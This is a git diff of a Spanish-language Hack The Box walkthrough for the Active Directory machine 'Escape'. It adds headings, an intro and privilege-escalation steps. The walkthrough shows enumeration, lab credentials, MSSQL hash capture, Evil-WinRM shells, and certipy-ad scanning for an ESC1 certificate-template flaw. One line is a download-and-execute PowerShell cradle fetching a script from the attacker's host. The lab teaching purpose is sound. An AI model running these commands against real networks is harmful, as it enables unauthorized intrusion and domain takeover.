@@ -1,4 +1,5 @@
 ---
+icon: desktop
 layout:
   title:
     visible: true
@@ -14,7 +15,13 @@ layout:
 
 # Escape
 
+`Escape` es una máquina Windows Active Directory de dificultad media que comienza con un recurso compartido SMB en el que los usuarios autenticados como invitados pueden descargar un archivo PDF confidencial. Dentro del archivo PDF hay credenciales temporales disponibles para acceder a un servicio MSSQL que se ejecuta en la máquina. Un atacante puede forzar al servicio MSSQL a autenticarse en su máquina y capturar el hash. Resulta que el servicio se está ejecutando bajo una cuenta de usuario y el hash es descifrable. Con un conjunto válido de credenciales, un atacante puede ejecutar un comando en la máquina usando WinRM. Al enumerar la máquina, un archivo de registro revela las credenciales del usuario `ryan.cooper`. Una enumeración adicional de la máquina revela que hay una autoridad de certificación presente y una plantilla de certificado es vulnerable al ataque ESC1, lo que significa que los usuarios que son legibles para usar esta plantilla pueden solicitar certificados para cualquier otro usuario en el dominio, incluidos los administradores de dominio. Por lo tanto, al explotar la vulnerabilidad ESC1, un atacante puede obtener un certificado válido para la cuenta de administrador y luego usarlo para obtener el hash del usuario administrador.
 
+<figure><img src="../../.gitbook/assets/Escape.png" alt="" width="563"><figcaption></figcaption></figure>
+
+***
+
+## Reconnaissance
 
 
 
@@ -81,7 +88,6 @@ PORT      STATE SERVICE          REASON
 Read data files from: /usr/share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 193.11 seconds
            Raw packets sent: 196703 (8.655MB) | Rcvd: 249 (14.596KB)
-
 ```
 
 
@@ -217,6 +223,8 @@ defaultNamingContext: DC=sequel,DC=htb
 
 
 
+## RID Cycling Attack
+
 
 
 ```bash
@@ -280,6 +288,8 @@ James.Roberts
 Nicole.Thompson
 ```
 
+## AS-REP Roast Attack \[FAILED]
+
 
 
 ```bash
@@ -298,7 +308,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [-] User Nicole.Thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-
+## SMB Enumeration
 
 
 
@@ -380,6 +390,10 @@ SMB         10.10.11.202    445    DC               [+] File "SQL Server Procedu
 
 
 
+## Information Leakage
+
+
+
 <figure><img src="../../.gitbook/assets/imagen (422).png" alt=""><figcaption></figcaption></figure>
 
 
@@ -403,6 +417,14 @@ SMB         10.10.11.202    445    DC               [-] sequel.htb\James.Roberts
 SMB         10.10.11.202    445    DC               [-] sequel.htb\Nicole.Thompson:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
 SMB         10.10.11.202    445    DC               [+] sequel.htb\PublicUser:GuestUserCantWrite1 (Guest)
 ```
+
+
+
+## Initial Foothold
+
+
+
+### MSSQL Enumeration
 
 
 
@@ -430,6 +452,8 @@ model                    0
 msdb                     1  
 ```
 
+### Attempting to enable xp\_cmdshell component in MSSQL \[FAILED]
+
 
 
 ```bash
@@ -439,6 +463,10 @@ ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE sta
 ERROR(DC\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
 ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
 ```
+
+
+
+### MSSQL Hash Stealing \[Net-NTLMv2] (xp\_dirtree)
 
 
 
@@ -528,6 +556,10 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\sql_svc\Documents> 
 ```
 
+## Initial Access
+
+### Information Leakage
+
 
 
 ```powershell
@@ -559,6 +591,8 @@ Info: Download successful!
 ```
 {% endcode %}
 
+### Abusing WinRM - EvilWinRM
+
 
 
 ```bash
@@ -578,10 +612,129 @@ Info: Establishing connection to remote endpoint
 4b79e2057279cc62d102952efa6f1bfd
 ```
 
+## Privilege Escalation
+
+### DC Enumeration (adPEAS) - Powershell tool to automate Active Directory enumeration
+
+
+
+```bash
+❯ wget https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS.ps1
+--2025-02-20 08:22:11--  https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS.ps1
+Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
+Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.108.133]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 3493853 (3,3M) [text/plain]
+Grabando a: «adPEAS.ps1»
+
+adPEAS.ps1                                                100%[==================================================================================================================================>]   3,33M  --.-KB/s    en 0,1s    
+
+2025-02-20 08:22:12 (30,2 MB/s) - «adPEAS.ps1» guardado [3493853/3493853]
+
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+
+
+
+
+```powershell
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> IEX (New-Object Net.WebClient).downloadString("http://10.10.16.3/adPEAS.ps1")
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> Invoke-adPEAS
+```
+
+```powershell
+[?] +++++ Searching for Active Directory Certificate Services Information +++++
+[+] Found at least one available Active Directory Certificate Service
+adPEAS does basic enumeration only, consider reading https://posts.specterops.io/certified-pre-owned-d95910965cd2
+
+[+] Found Active Directory Certificate Services 'sequel-DC-CA':
+CA Name:				sequel-DC-CA
+CA dnshostname:				dc.sequel.htb
+CA IP Address:				10.10.11.202
+Date of Creation:			11/18/2022 21:08:46
+DistinguishedName:			CN=sequel-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb
+NTAuthCertificates:			True
+Available Templates:			UserAuthentication
+					DirectoryEmailReplication
+					DomainControllerAuthentication
+					KerberosAuthentication
+					EFSRecovery
+					EFS
+					DomainController
+					WebServer
+					Machine
+					User
+					SubCA
+					Administrator
+
+[?] +++++ Searching for Vulnerable Certificate Templates +++++
+adPEAS does basic enumeration only, consider using https://github.com/GhostPack/Certify or https://github.com/ly4k/Certipy
+
+[?] +++++ Checking Template 'UserAuthentication' +++++
+[!] Template 'UserAuthentication' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'
+[!] Identity 'sequel\sql_svc' has 'GenericAll' permissions on template 'UserAuthentication'
+[+] Identity 'sequel\Domain Users' has enrollment rights for template 'UserAuthentication'
+Template Name:				UserAuthentication
+Template distinguishedname:		CN=UserAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb
+Date of Creation:			11/18/2022 21:10:22
+[+] Extended Key Usage:			Client Authentication, Secure E-mail, Encrypting File System
+EnrollmentFlag:				INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+[!] CertificateNameFlag:		ENROLLEE_SUPPLIES_SUBJECT
+[!] Template Permissions:		sequel\sql_svc : GenericAll
+[+] Enrollment allowed for:		sequel\Domain Users
+```
+
+
+
+### Abusing Active Directory Certificate Services (ADCS)
+
 
 
 ```bash
 ❯ sudo ntpdate -s 10.10.11.202
+```
+
+
+
+```bash
+❯ certipy-ad find -u 'sql_svc'@10.10.11.202 -p 'REGGIE1234ronnie' -dc-ip 10.10.11.202 -vulnerable -stdout
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
+[*] Got CA configuration for 'sequel-DC-CA'
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC-CA
+    DNS Name                            : dc.sequel.htb
+    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
+    Certificate Validity End            : 2121-11-18 21:08:46+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates                   : [!] Could not find any certificate templates
 ```
 
 
@@ -665,6 +818,8 @@ Certificate Templates
     [!] Vulnerabilities
       ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
 ```
+
+### ESC1 exploitation case with certipy-ad
 
 
 
